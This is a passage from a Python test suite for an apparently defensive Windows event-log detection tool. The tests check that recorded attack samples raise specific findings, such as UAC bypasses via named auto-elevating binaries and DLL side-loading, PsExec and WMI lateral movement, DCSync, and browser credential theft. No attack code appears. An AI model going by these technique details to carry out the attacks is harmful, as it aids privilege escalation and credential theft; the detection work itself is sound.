        finding = next((item for item in findings["findings"] if item.get("title") == "Renamed PsExec Service Pipes"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "renamed_psexec_service_pipes"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["process"], r"C:\Windows\svchost.exe")

    @unittest.skipUnless(METERPRETER_NAMEDPIPE_GETSYSTEM_SAMPLE.is_file(), "meterpreter named-pipe getsystem sample not available")
    def test_attack_sample_meterpreter_namedpipe_getsystem_prefers_service_imagepath_abuse(self):
        findings = self._run_dataset(METERPRETER_NAMEDPIPE_GETSYSTEM_SAMPLE, "test-attack-sample-meterpreter-namedpipe-getsystem")
        titles = {item.get("title") for item in findings["findings"]}
        incident_types = {item.get("incident_type") for item in findings["incidents"]}
        finding = next((item for item in findings["findings"] if item.get("title") == "Service ImagePath Command Abuse"), None)

        self.assertIn("Service ImagePath Command Abuse", titles)
        self.assertIn("service_imagepath_command_abuse", incident_types)
        self.assertNotIn("PsExec Named Pipe Stager", titles)
        self.assertNotIn("Suspicious: Named Pipe PowerShell", titles)
        self.assertIsNotNone(finding)
        self.assertEqual(finding["process"], r"C:\Windows\System32\cmd.exe")

    @unittest.skipUnless(USCHEDULER_CVE_SAMPLE.is_file(), "UScheduler CVE sample not available")
    def test_attack_sample_uscheduler_cve_generates_specific_finding_and_incident(self):
        findings = self._run_dataset(USCHEDULER_CVE_SAMPLE, "test-attack-sample-uscheduler-cve")
        finding = next((item for item in findings["findings"] if item.get("title") == "Windows Update UScheduler Command Hijack"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "windows_update_uscheduler_command_hijack"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual((finding.get("evidence", {}) or {}).get("scheduler_id"), "51999")

    @unittest.skipUnless(LICHTSINNIG_FTP_EXEC_SAMPLE.is_file(), "Lichtsinnig FTP execution sample not available")
    def test_lichtsinnig_ftp_exec_generates_specific_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_FTP_EXEC_SAMPLE, "test-lichtsinnig-ftp-exec")
        finding = next((item for item in findings["findings"] if item.get("title") == "FTP Script Command Execution"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "ftp_script_command_execution"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["process"], r"C:\Windows\System32\cmd.exe")

    @unittest.skipUnless(LICHTSINNIG_ACCESSVBOM_SAMPLE.is_file(), "Lichtsinnig AccessVBOM sample not available")
    def test_lichtsinnig_accessvbom_generates_specific_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_ACCESSVBOM_SAMPLE, "test-lichtsinnig-accessvbom")
        finding = next((item for item in findings["findings"] if item.get("title") == "Office VBA Object Model Access Enabled"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "office_vba_object_model_enabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["evidence"].get("office_app"), "excel")

    @unittest.skipUnless(LICHTSINNIG_SCHEDTASK_SYSTEM_SAMPLE.is_file(), "Lichtsinnig SYSTEM scheduled-task sample not available")
    def test_lichtsinnig_schedtask_system_generates_specific_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_SCHEDTASK_SYSTEM_SAMPLE, "test-lichtsinnig-schedtask-system")
        finding = next((item for item in findings["findings"] if item.get("title") == "Scheduled Task SYSTEM Elevation"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "scheduled_task_system_elevation"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["evidence"].get("task_name"), "elevator")

    @unittest.skipUnless(MITRE_PRINTNIGHTMARE_SAMPLE.is_file(), "PrintNightmare sample not available")
    def test_mitre_printnightmare_generates_specific_finding_and_incident(self):
        findings = self._run_dataset(MITRE_PRINTNIGHTMARE_SAMPLE, "test-mitre-printnightmare")
        finding = next((item for item in findings["findings"] if item.get("title") == "Print Spooler Exploitation"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "print_spooler_exploitation"), None)
        generic = next((item for item in findings["findings"] if item.get("title") == "Spooler Spawned Shell"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIsNone(generic)

    @unittest.skipUnless(LICHTSINNIG_WMI_CMD_CONSUMER_SAMPLE.is_file(), "Lichtsinnig WMI command consumer sample not available")
    def test_lichtsinnig_sysmon_wmi_command_consumer_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_WMI_CMD_CONSUMER_SAMPLE, "test-lichtsinnig-wmi-command-consumer")
        finding = next((item for item in findings["findings"] if item.get("title") == "WMI Permanent Event Subscription"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "wmi_permanent_subscription"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(LICHTSINNIG_WMIGHOST_SAMPLE.is_file(), "Lichtsinnig WMIGhost sample not available")
    def test_lichtsinnig_wmighost_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_WMIGHOST_SAMPLE, "test-lichtsinnig-wmighost")
        finding = next((item for item in findings["findings"] if item.get("title") == "WMI Permanent Event Subscription"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "wmi_permanent_subscription"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(LICHTSINNIG_UAC_SDCLT_SAMPLE.is_file(), "Lichtsinnig SDCLT UAC sample not available")
    def test_lichtsinnig_uac_sdclt_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_UAC_SDCLT_SAMPLE, "test-lichtsinnig-uac-sdclt")
        finding = next((item for item in findings["findings"] if item.get("title") == "UAC Bypass via Auto-Elevated Registry Hijack"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "uac_bypass_registry_hijack"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(LICHTSINNIG_UAC_EVENTVWR_SAMPLE.is_file(), "Lichtsinnig EventVwr UAC sample not available")
    def test_lichtsinnig_uac_eventvwr_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_UAC_EVENTVWR_SAMPLE, "test-lichtsinnig-uac-eventvwr")
        finding = next((item for item in findings["findings"] if item.get("title") == "UAC Bypass via Auto-Elevated Registry Hijack"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "uac_bypass_registry_hijack"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(LICHTSINNIG_UAC_COMPMGMT_SAMPLE.is_file(), "Lichtsinnig CompMgmtLauncher UAC sample not available")
    def test_lichtsinnig_uac_compmgmt_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_UAC_COMPMGMT_SAMPLE, "test-lichtsinnig-uac-compmgmt")
        finding = next((item for item in findings["findings"] if item.get("title") == "UAC Bypass via Auto-Elevated Registry Hijack"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "uac_bypass_registry_hijack"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["evidence"].get("trigger_binary"), "compmgmtlauncher.exe")

    @unittest.skipUnless(LICHTSINNIG_UAC_APPPATH_SAMPLE.is_file(), "Lichtsinnig AppPath Control UAC sample not available")
    def test_lichtsinnig_uac_apppath_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_UAC_APPPATH_SAMPLE, "test-lichtsinnig-uac-apppath")
        finding = next((item for item in findings["findings"] if item.get("title") == "UAC Bypass via Auto-Elevated Registry Hijack"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "uac_bypass_registry_hijack"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("app paths\\control.exe", (finding["evidence"].get("registry_key", "") or "").lower())

    @unittest.skipUnless(LICHTSINNIG_UAC_CMSTP_SAMPLE.is_file(), "Lichtsinnig CMSTP UAC sample not available")
    def test_lichtsinnig_uac_cmstp_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_UAC_CMSTP_SAMPLE, "test-lichtsinnig-uac-cmstp")
        finding = next((item for item in findings["findings"] if item.get("title") == "CMSTP UAC Bypass"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "cmstp_uac_bypass"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("cmmgr32.exe", (finding["evidence"].get("registry_key", "") or "").lower())

    @unittest.skipUnless(LICHTSINNIG_UAC_PERFMON_SAMPLE.is_file(), "Lichtsinnig Perfmon UAC sample not available")
    def test_lichtsinnig_uac_perfmon_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_UAC_PERFMON_SAMPLE, "test-lichtsinnig-uac-perfmon")
        finding = next((item for item in findings["findings"] if item.get("title") == "Volatile SYSTEMROOT UAC Bypass"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "volatile_systemroot_uac_bypass"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("temp", (finding["evidence"].get("redirected_systemroot", "") or "").lower())

    @unittest.skipUnless(LICHTSINNIG_UAC_SYSPREP_SAMPLE.is_file(), "Lichtsinnig sysprep UAC sample not available")
    def test_lichtsinnig_uac_sysprep_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_UAC_SYSPREP_SAMPLE, "test-lichtsinnig-uac-sysprep")
        finding = next((item for item in findings["findings"] if item.get("title") == "UAC Bypass via DLL Side-Loading"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "uac_bypass_dll_sideload"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("cryptbase.dll", (finding["evidence"].get("loaded_module", "") or "").lower())

    @unittest.skipUnless(LICHTSINNIG_UAC_SYSPREP_ELEVATE_SAMPLE.is_file(), "Lichtsinnig elevated sysprep UAC sample not available")
    def test_lichtsinnig_uac_sysprep_elevate_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_UAC_SYSPREP_ELEVATE_SAMPLE, "test-lichtsinnig-uac-sysprep-elevate")
        finding = next((item for item in findings["findings"] if item.get("title") == "UAC Bypass via DLL Side-Loading"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "uac_bypass_dll_sideload"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(LICHTSINNIG_UAC_MIGWIZ_SAMPLE.is_file(), "Lichtsinnig migwiz UAC sample not available")
    def test_lichtsinnig_uac_migwiz_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_UAC_MIGWIZ_SAMPLE, "test-lichtsinnig-uac-migwiz")
        finding = next((item for item in findings["findings"] if item.get("title") == "UAC Bypass via DLL Side-Loading"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "uac_bypass_dll_sideload"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("migwiz.exe", (finding["evidence"].get("target_binary", "") or "").lower())

    @unittest.skipUnless(LICHTSINNIG_UAC_CLICONFG_SAMPLE.is_file(), "Lichtsinnig cliconfg UAC sample not available")
    def test_lichtsinnig_uac_cliconfg_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_UAC_CLICONFG_SAMPLE, "test-lichtsinnig-uac-cliconfg")
        finding = next((item for item in findings["findings"] if item.get("title") == "UAC Bypass via DLL Side-Loading"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "uac_bypass_dll_sideload"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("ntwdblib.dll", (finding["evidence"].get("loaded_module", "") or "").lower())

    @unittest.skipUnless(LICHTSINNIG_UAC_MCX2PROV_SAMPLE.is_file(), "Lichtsinnig mcx2prov UAC sample not available")
    def test_lichtsinnig_uac_mcx2prov_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_UAC_MCX2PROV_SAMPLE, "test-lichtsinnig-uac-mcx2prov")
        finding = next((item for item in findings["findings"] if item.get("title") == "UAC Bypass via DLL Side-Loading"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "uac_bypass_dll_sideload"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("mcx2prov.exe", (finding["evidence"].get("target_binary", "") or "").lower())

    @unittest.skipUnless(LICHTSINNIG_UAC_WSCRIPT_SAMPLE.is_file(), "Lichtsinnig wscript UAC sample not available")
    def test_lichtsinnig_uac_wscript_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_UAC_WSCRIPT_SAMPLE, "test-lichtsinnig-uac-wscript")
        finding = next((item for item in findings["findings"] if item.get("title") == "WScript Manifest UAC Bypass"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "wscript_manifest_uac_bypass"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("wscript.exe.manifest", (finding["evidence"].get("manifest_path", "") or "").lower())

    @unittest.skipUnless(LICHTSINNIG_LETHALHTA_SAMPLE.is_file(), "Lichtsinnig lethal HTA sample not available")
    def test_lichtsinnig_lethalhta_generates_specific_incident(self):
        findings = self._run_dataset(LICHTSINNIG_LETHALHTA_SAMPLE, "test-lichtsinnig-lethalhta")
        finding = next((item for item in findings["findings"] if item.get("title") == "DCOM MSHTA Remote Execution"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "dcom_mshta_remote_execution"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["process"], r"C:\Windows\System32\mshta.exe")

    @unittest.skipUnless(HAYABUSA_DCOM_MSHTA_SAMPLE.is_file(), "Hayabusa DCOM MSHTA sample not available")
    def test_hayabusa_dcom_mshta_generates_specific_incident(self):
        findings = self._run_dataset(HAYABUSA_DCOM_MSHTA_SAMPLE, "test-hayabusa-dcom-mshta")
        finding = next((item for item in findings["findings"] if item.get("title") == "DCOM MSHTA Remote Execution"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "dcom_mshta_remote_execution"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual((finding.get("evidence", {}).get("remote_peer_ip") or ""), "10.0.2.17")

    @unittest.skipUnless(LICHTSINNIG_RUNDLL32_MSHTA_TASK_SAMPLE.is_file(), "Lichtsinnig rundll32-mshta-task sample not available")
    def test_lichtsinnig_rundll32_mshta_schedtask_sequence_generates_incident(self):
        findings = self._run_dataset(LICHTSINNIG_RUNDLL32_MSHTA_TASK_SAMPLE, "test-lichtsinnig-rundll32-mshta-task")
        rundll = next((item for item in findings["findings"] if item.get("title") == "Rundll32 Proxy Execution"), None)
        mshta = next((item for item in findings["findings"] if item.get("title") == "MSHTA HTA Execution"), None)
        incident = next(
            (item for item in findings["incidents"] if item.get("incident_type") == "rundll32_mshta_scheduled_task_persistence"),
            None,
        )
        self.assertIsNotNone(rundll)
        self.assertIsNotNone(mshta)
        self.assertIsNotNone(incident)
        self.assertIn("msoffice_", json.dumps(incident.get("evidence_chain", [])).lower())

    @unittest.skipUnless(HAYABUSA_RUNDLL32_OPENURL_SAMPLE.is_file(), "Hayabusa rundll32 openurl sample not available")
    def test_hayabusa_rundll32_openurl_generates_proxy_and_mshta_findings(self):
        findings = self._run_dataset(HAYABUSA_RUNDLL32_OPENURL_SAMPLE, "test-hayabusa-rundll32-openurl")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("Rundll32 Proxy Execution", titles)
        self.assertIn("MSHTA HTA Execution", titles)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "mshta_hta_execution"), None)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(LICHTSINNIG_TSCLIENT_SAMPLE.is_file(), "Lichtsinnig TSCLIENT sample not available")
    def test_lichtsinnig_tsclient_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_TSCLIENT_SAMPLE, "test-lichtsinnig-tsclient")
        finding = next((item for item in findings["findings"] if item.get("title") == "TSCLIENT Startup Folder Drop"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "tsclient_startup_drop"), None)
        generic = [item for item in findings["findings"] if item.get("title") == "Startup Folder Drop"]
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(generic, [])

    @unittest.skipUnless(LICHTSINNIG_BROWSER_CRED_SAMPLE.is_file(), "Lichtsinnig browser credential sample not available")
    def test_lichtsinnig_browser_credential_access_groups_to_specific_finding(self):
        findings = self._run_dataset(LICHTSINNIG_BROWSER_CRED_SAMPLE, "test-lichtsinnig-browser-cred")
        finding = next((item for item in findings["findings"] if item.get("title") == "Browser Credential Store Access"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "browser_credential_store_access"), None)
        generic = [item for item in findings["findings"] if item.get("title") == "Credential File Access"]
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(sorted(finding["evidence"].get("browser_families", [])), ["chrome", "firefox", "opera"])
        self.assertEqual(generic, [])

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "hayabusa_remote_registry_wmi.evtx").is_file(), "Hayabusa remote registry WMI sample not available")
    def test_hayabusa_remote_registry_wmi_generates_correlated_persistence_incident(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "hayabusa_remote_registry_wmi.evtx", "test-hayabusa-remote-registry-wmi")
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "wmi_remote_registry_persistence"), None)
        generic = [item for item in findings["incidents"] if item.get("incident_type") == "critical_finding_promotion"]
        self.assertIsNotNone(incident)
        self.assertEqual(generic, [])

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "mitre_guest_account_activated.evtx").is_file(), "Guest account activation sample not available")
    def test_mitre_guest_account_activated_generates_specific_incident(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "mitre_guest_account_activated.evtx", "test-mitre-guest-account-activated")
        finding = next((item for item in findings["findings"] if item.get("title") == "Guest Account Enabled"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "guest_account_enabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "mitre_sid_history.evtx").is_file(), "SID history sample not available")
    def test_mitre_sid_history_generates_specific_incident(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "mitre_sid_history.evtx", "test-mitre-sid-history")
        finding = next((item for item in findings["findings"] if item.get("title") == "SID History Added"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "sid_history_added"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "mitre_system_rights.evtx").is_file(), "System rights sample not available")
    def test_mitre_system_rights_generates_specific_incident(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "mitre_system_rights.evtx", "test-mitre-system-rights")
        finding = next((item for item in findings["findings"] if item.get("title") == "System Security Access Granted"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "system_security_access_granted"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "mitre_user_rights.evtx").is_file(), "User rights sample not available")
    def test_mitre_user_rights_groups_to_specific_incident(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "mitre_user_rights.evtx", "test-mitre-user-rights")
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "sensitive_user_rights_assignment"), None)
        generic = [item for item in findings["incidents"] if item.get("incident_type") == "critical_finding_promotion"]
        self.assertIsNotNone(incident)
        self.assertEqual(generic, [])

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "hayabusa_mshta.evtx").is_file(), "Hayabusa mshta sample not available")
    def test_hayabusa_mshta_generates_specific_incident(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "hayabusa_mshta.evtx", "test-hayabusa-mshta")
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "mshta_hta_execution"), None)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "hayabusa_regsvr32_sct.evtx").is_file(), "Hayabusa regsvr32 sample not available")
    def test_hayabusa_regsvr32_generates_specific_incident(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "hayabusa_regsvr32_sct.evtx", "test-hayabusa-regsvr32")
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "regsvr32_scriptlet_execution"), None)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "hayabusa_wmic_xsl.evtx").is_file(), "Hayabusa wmic xsl sample not available")
    def test_hayabusa_wmic_xsl_generates_specific_incident(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "hayabusa_wmic_xsl.evtx", "test-hayabusa-wmic-xsl")
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "wmic_xsl_script_processing"), None)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "mitre_certutil_download.evtx").is_file(), "Certutil sample not available")
    def test_mitre_certutil_download_generates_specific_incident(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "mitre_certutil_download.evtx", "test-mitre-certutil")
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "certutil_remote_download"), None)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "mitre_bits_transfer.evtx").is_file(), "BITS transfer sample not available")
    def test_mitre_bits_transfer_generates_specific_incident(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "mitre_bits_transfer.evtx", "test-mitre-bits-transfer")
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "bitsadmin_transfer"), None)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "mitre_bits_powershell.evtx").is_file(), "PowerShell BITS sample not available")
    def test_mitre_bits_powershell_generates_specific_incident(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "mitre_bits_powershell.evtx", "test-mitre-bits-powershell")
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "powershell_bits_download"), None)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "hayabusa_bits_notify.evtx").is_file(), "Hayabusa bits notify sample not available")
    def test_hayabusa_bits_notify_generates_correlated_incident(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "hayabusa_bits_notify.evtx", "test-hayabusa-bits-notify")
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "bits_notify_execution"), None)
        generic = [item for item in findings["incidents"] if item.get("incident_type") == "critical_finding_promotion"]
        self.assertIsNotNone(incident)
        self.assertEqual(generic, [])

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "hayabusa_bits_client.evtx").is_file(), "Hayabusa bits client sample not available")
    def test_hayabusa_bits_client_groups_to_specific_incident(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "hayabusa_bits_client.evtx", "test-hayabusa-bits-client")
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "bits_suspicious_job"), None)
        generic = [item for item in findings["incidents"] if item.get("incident_type") == "critical_finding_promotion"]
        self.assertIsNotNone(incident)
        self.assertEqual(generic, [])

    @unittest.skipUnless(BITS_OPENVPN_SAMPLE.is_file(), "BITS openvpn sample not available")
    def test_attack_sample_bits_openvpn_filters_known_benign_background_jobs(self):
        findings = self._run_dataset(BITS_OPENVPN_SAMPLE, "test-attack-sample-bits-openvpn")
        self.assertEqual(len(findings["findings"]), 0)
        self.assertEqual(len(findings["incidents"]), 0)

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "hayabusa_dcsync_4662.evtx").is_file(), "DCSync sample not available")
    def test_hayabusa_dcsync_generates_specific_incident(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "hayabusa_dcsync_4662.evtx", "test-hayabusa-dcsync")
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "dcsync_directory_replication"), None)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(WMIEXEC_SAMPLE.is_file(), "WMI exec EVTX sample not available")
    def test_attack_sample_wmi_exec_generates_finding_and_incident(self):
        findings = self._run_dataset(WMIEXEC_SAMPLE, "test-attack-sample-wmiexec")
        finding = next((item for item in findings["findings"] if item.get("title") == "WMI Remote Execution"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "wmi_remote_execution"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["user"], r"IEWIN7\IEUser")

    @unittest.skipUnless(COM_HIJACK_SAMPLE.is_file(), "COM hijack EVTX sample not available")
    def test_attack_sample_com_hijack_generates_finding_and_incident(self):
        findings = self._run_dataset(COM_HIJACK_SAMPLE, "test-attack-sample-comhijack")
        finding = next((item for item in findings["findings"] if item.get("title") == "COM Hijacking Persistence"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "com_hijack_persistence"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["evidence"].get("dll_path"), r"C:\Users\User\Documents\mapid.tlb")

    @unittest.skipUnless(RUNAS_SAMPLE.is_file(), "runas EVTX sample not available")
    def test_attack_sample_runas_generates_finding_and_incident(self):
        findings = self._run_dataset(RUNAS_SAMPLE, "test-attack-sample-runas")
        finding = next((item for item in findings["findings"] if item.get("title") == "RunAs Different User"), None)
        self.assertIsNotNone(finding)
        self.assertGreaterEqual(findings["summary"]["incident_count"], 1)

    @unittest.skipUnless(TOKEN_SAMPLE.is_file(), "token manipulation EVTX sample not available")
    def test_attack_sample_token_manip_generates_finding_and_incident(self):
        findings = self._run_dataset(TOKEN_SAMPLE, "test-attack-sample-token")
        finding = next((item for item in findings["findings"] if item.get("title") == "Token Manipulation Activity"), None)
        self.assertIsNotNone(finding)
        self.assertGreaterEqual(findings["summary"]["incident_count"], 1)

    @unittest.skipUnless(ATEXEC_SAMPLE.is_file(), "ATexec EVTX sample not available")
    def test_attack_sample_atexec_generates_finding_and_incident(self):
        findings = self._run_dataset(ATEXEC_SAMPLE, "test-attack-sample-atexec")
        finding = next((item for item in findings["findings"] if item.get("title") == "Transient Scheduled Task Execution"), None)
        self.assertIsNotNone(finding)
        self.assertGreaterEqual(findings["summary"]["incident_count"], 1)

    @unittest.skipUnless(SMBEXEC_SAMPLE.is_file(), "SMBexec EVTX sample not available")
    def test_attack_sample_smbexec_generates_finding_and_incident(self):
        findings = self._run_dataset(SMBEXEC_SAMPLE, "test-attack-sample-smbexec")
        finding = next((item for item in findings["findings"] if item.get("title") == "SMBexec Service Payload"), None)
        self.assertIsNotNone(finding)
        self.assertGreaterEqual(findings["summary"]["incident_count"], 1)

    @unittest.skipUnless(PSEXEC_NATIVE_SYSTEM_SAMPLE.is_file(), "PsExec service EVTX sample not available")
    def test_attack_sample_psexec_service_generates_finding_and_incident(self):
        findings = self._run_dataset(PSEXEC_NATIVE_SYSTEM_SAMPLE, "test-attack-sample-psexec-service")
        finding = next((item for item in findings["findings"] if item.get("title") == "PsExec Service Payload"), None)
        self.assertIsNotNone(finding)
        self.assertGreaterEqual(findings["summary"]["incident_count"], 1)

    @unittest.skipUnless(PSEXEC_NATIVE_SECURITY_SAMPLE.is_file() or PSEXEC_POWERSHELL_SECURITY_SAMPLE.is_file(), "PsExec security EVTX sample not available")
    def test_attack_sample_psexec_named_pipe_generates_finding_and_incident(self):
        source = PSEXEC_NATIVE_SECURITY_SAMPLE if PSEXEC_NATIVE_SECURITY_SAMPLE.is_file() else PSEXEC_POWERSHELL_SECURITY_SAMPLE
        findings = self._run_dataset(source, "test-attack-sample-psexec-pipe")
        finding = next((item for item in findings["findings"] if item.get("title") == "PsExec Named Pipe Stager"), None)
        self.assertIsNotNone(finding)
        self.assertGreaterEqual(findings["summary"]["incident_count"], 1)

    @unittest.skipUnless(ATEXEC_SAMPLE.is_file(), "ATexec EVTX sample not available")
    def test_attack_sample_atexec_specific_sequence_generates_finding(self):
        findings = self._run_dataset(ATEXEC_SAMPLE, "test-attack-sample-atexec-sequence")
        finding = next((item for item in findings["findings"] if item.get("title") == "ATexec Remote Task Execution"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(SCHEDTASK_SAMPLE.is_file(), "scheduled task EVTX sample not available")
    def test_attack_sample_schedtask_generates_transient_task_finding(self):
        findings = self._run_dataset(SCHEDTASK_SAMPLE, "test-attack-sample-schedtask")
        finding = next((item for item in findings["findings"] if item.get("title") == "Transient Scheduled Task Execution"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(SMBEXEC_SAMPLE.is_file(), "SMBexec EVTX sample not available")
    def test_attack_sample_smbexec_specific_sequence_generates_finding(self):
        findings = self._run_dataset(SMBEXEC_SAMPLE, "test-attack-sample-smbexec-sequence")
        finding = next((item for item in findings["findings"] if item.get("title") == "SMBexec Remote Execution Sequence"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(PSEXEC_NATIVE_SECURITY_SAMPLE.is_file() and PSEXEC_NATIVE_SYSTEM_SAMPLE.is_file(), "combined PsExec EVTX samples not available")
    def test_attack_sample_psexec_combined_logs_generate_sequence_finding(self):
        temp_dir = Path(tempfile.mkdtemp(prefix="triage-psexec-combined-", dir=str(ROOT)))
        self.addCleanup(shutil.rmtree, temp_dir, True)
        shutil.copy2(PSEXEC_NATIVE_SECURITY_SAMPLE, temp_dir / PSEXEC_NATIVE_SECURITY_SAMPLE.name)
